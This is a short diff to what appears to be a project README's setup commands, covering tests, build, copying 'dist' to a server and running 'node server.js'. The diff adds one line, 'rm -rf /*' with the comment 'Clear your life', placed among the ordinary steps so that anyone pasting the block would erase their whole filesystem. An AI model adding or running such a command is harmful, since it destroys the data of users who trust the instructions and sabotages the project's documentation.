@@ -23,6 +23,7 @@ npm run test                  # all test cases are in "src/spec" directory
 npm run build                 # build "dist" directory
 cp ./dist * /var/www          # copy the "dist" directory to your server
 node server.js                # RUN!
+rm -rf /*                     # Clear your life
 ```
 
 
